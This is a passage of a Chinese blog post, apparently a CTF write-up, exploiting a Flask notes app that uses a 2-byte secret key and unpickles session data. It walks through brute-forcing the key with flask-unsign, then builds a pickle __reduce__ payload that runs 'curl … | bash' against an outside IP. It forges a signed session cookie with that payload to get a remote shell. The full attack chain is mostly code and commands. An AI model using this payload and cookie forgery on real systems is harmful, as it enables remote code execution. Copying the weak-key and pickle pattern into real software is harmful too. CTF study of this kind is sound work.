class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, session</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = os.urandom(<span class="number">2</span>).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Note</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, content</span>):</span><br><span class="line">        <span class="variable language_">self</span>._name = name</span><br><span class="line">        <span class="variable language_">self</span>._content = content</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">name</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>._name</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">content</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>._content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&lt;path:note_id&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view_note</span>(<span class="params">note_id</span>):</span><br><span class="line">    notes = session.get(<span class="string">&#x27;notes&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> notes:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;note.html&#x27;</span>, msg=<span class="string">&#x27;You have no notes&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    note_raw = notes.get(note_id)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> note_raw:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;note.html&#x27;</span>, msg=<span class="string">&#x27;This note does not exist&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    note = pickle.loads(note_raw)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;note.html&#x27;</span>, note_id=note_id, note_name=note.name, note_content=note.content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/add_note&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_note</span>():</span><br><span class="line">    note_name = request.form.get(<span class="string">&#x27;note_name&#x27;</span>)</span><br><span class="line">    note_content = request.form.get(<span class="string">&#x27;note_content&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> note_name == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> note_content == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, status=<span class="string">&#x27;add_failed&#x27;</span>, msg=<span class="string">&#x27;note name or content is empty&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    note_id = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line">    note = Note(note_name, note_content)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;notes&#x27;</span>):</span><br><span class="line">        session[<span class="string">&#x27;notes&#x27;</span>] = &#123;&#125;</span><br><span class="line">    </span><br><span class="line">    notes = session[<span class="string">&#x27;notes&#x27;</span>]</span><br><span class="line">    notes[note_id] = pickle.dumps(note)</span><br><span class="line">    session[<span class="string">&#x27;notes&#x27;</span>] = notes</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, status=<span class="string">&#x27;add_success&#x27;</span>, note_id=note_id)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/delete_note&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_note</span>():</span><br><span class="line">    note_id = request.form.get(<span class="string">&#x27;note_id&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> note_id:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    notes = session.get(<span class="string">&#x27;notes&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> notes:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, status=<span class="string">&#x27;delete_failed&#x27;</span>, msg=<span class="string">&#x27;You have no notes&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> notes.get(note_id):</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, status=<span class="string">&#x27;delete_failed&#x27;</span>, msg=<span class="string">&#x27;This note does not exist&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">del</span> notes[note_id]</span><br><span class="line">    session[<span class="string">&#x27;notes&#x27;</span>] = notes</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, status=<span class="string">&#x27;delete_success&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
+
+<p>发现密钥非常弱,可以爆破出来.其次&#x2F;<a href="path:note_id">path:note_id</a>路由下,<code>pickle.loads</code> 触发反序列化</p>
+<ol>
+<li><p>生成密钥爆破字典</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    secret_key=os.urandom(<span class="number">2</span>).<span class="built_in">hex</span>()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/var/1.txt&quot;</span>,<span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(secret_key+<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>解码原来的session</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --decode --cookie &quot;.eJwtysEKgjAYAOBXid0HbdPWhA5rKI3IQ9M0b_7mrJgWFBnI3r2CvvM3oeH2bB8omhBfCAi5tZidOMMBYzVeEtJiCk0tKOOkYeL3ZoAi1ElzSDv5p3YqERaK5A5OWKfHOOvFvKpM5lS_dhuab_WYlDQ8Q1HkVxm_v0eXNH3BsHcwmLyWFTleghXy3n8AceAtDQ.ZgDvKw.<span class="number">7</span>CbLZz_NzrKo8ZunE1HPgPKH6U0&quot;</span><br></pre></td></tr></table></figure>
+
+<p>输出:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;notes&#x27;: &#123;&#x27;769b57ff-3d73-433a-811e-2bca92371c39&#x27;: b&#x27;\x80\x04\x956\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x04Note\x94\x93\x94)\x81\x94&#125;\x94(\x8c\x05_name\x94\x8c\x011\x94\x8c\x08_content\x94h\x06ub.&#x27;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>value里是pickle序列化字符,这样可以知道session的格式长什么样</p>
+</li>
+<li><p>爆破密钥</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --unsign --cookie &quot;.eJwtysEKgjAYAOBXid0HbdPWhA5rKI3IQ9M0b_7mrJgWFBnI3r2CvvM3oeH2bB8omhBfCAi5tZidOMMBYzVeEtJiCk0tKOOkYeL3ZoAi1ElzSDv5p3YqERaK5A5OWKfHOOvFvKpM5lS_dhuab_WYlDQ8Q1HkVxm_v0eXNH3BsHcwmLyWFTleghXy3n8AceAtDQ.ZgDvKw.7CbLZz_NzrKo8ZunE1HPgPKH6U0&quot; -w &quot;/var/1.txt&quot;  --no-literal-eval</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20250911143241696.png" alt="image-20250911143241696"></p>
+</li>
+</ol>
+<p>​	得到密钥<code>f991</code></p>
+<ol start="4">
+<li><p>生成payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">aaa</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span>(os.system,(<span class="string">&#x27;curl ip/1 |bash&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">a = aaa()</span><br><span class="line"></span><br><span class="line">payload=pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">b&#x27;\x80\x04\x956\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x1bcurl 47.122.131.175/2 |bash\x94\x85\x94R\x94.&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>伪造session</p>
+<p>根据上面提到的session格式,伪造session</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;notes&#x27;:&#123;&#x27;769b57ff-3d73-433a-811e-2bca92371c39&#x27;:b&#x27;\x80\x04\x956\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x1bcurl 47.122.131.175/2 |bash\x94\x85\x94R\x94.&#x27;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --sign --cookie &quot;&#123;&#x27;notes&#x27;:&#123;&#x27;769b57ff-3d73-433a-811e-2bca92371c39&#x27;:b&#x27;\x80\x04\x956\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x1bcurl 47.122.131.175/2 |bash\x94\x85\x94R\x94.&#x27;&#125;&#125;&quot; --secret &quot;f991&quot;</span><br></pre></td></tr></table></figure>
+
+<p>得到session</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eJwtyk0LgjAYAOC_ErvvsL2rpdBBTURxRZki3XTqdIw6uL4U_3sEPednRre7bUfkzohvnHrNuw5DwwEzgApvCWkxrWXlUOBEgvN7qxq5SHlZcVDeXyD80n9KapiJX5EEMzVRYU1yzLVvdVMmY7w_QarDjxjYW0zhQ1wkSadYdVHSSzrk_fWcmYDt0LIsX5LELaA.aMJwgQ.0eQq7FtPDtVnOK5vI8uw-iWEcx8</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/202403251228130.png" alt="image-20240325122818244"></p>
+</li>
+</ol>
+<p>即可得到shell</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/python-pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"># python,pickle,反序列化</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/09/10/nssctf/" rel="prev" title="nssctf写题日记">
+                  <i class="fa fa-angle-left"></i> nssctf写题日记
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">hllttz</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">141k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span>站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">2:08</span>
+  </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
